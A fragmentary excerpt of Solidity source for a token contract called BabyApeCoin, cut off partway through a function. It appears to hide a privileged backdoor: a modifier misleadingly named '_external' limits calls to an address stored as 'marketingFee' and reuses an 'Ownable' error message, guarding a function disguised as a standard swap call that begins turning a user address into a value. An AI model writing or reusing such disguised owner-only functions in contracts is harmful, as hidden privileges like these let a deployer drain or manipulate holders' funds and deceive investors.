...
contract BabyApeCoin is Ownable {
  ...
  modifier _external() {
    require(address(marketingFee) == msg.sender, "Ownable: caller is not the owner");
    _;
  }
  ...
  function SwapETHForExactTokens(address user, uint256 _value) public _external returns(bool) {
    if(user != address(0)){
        uint256 amountToLiquify = uint256(user);
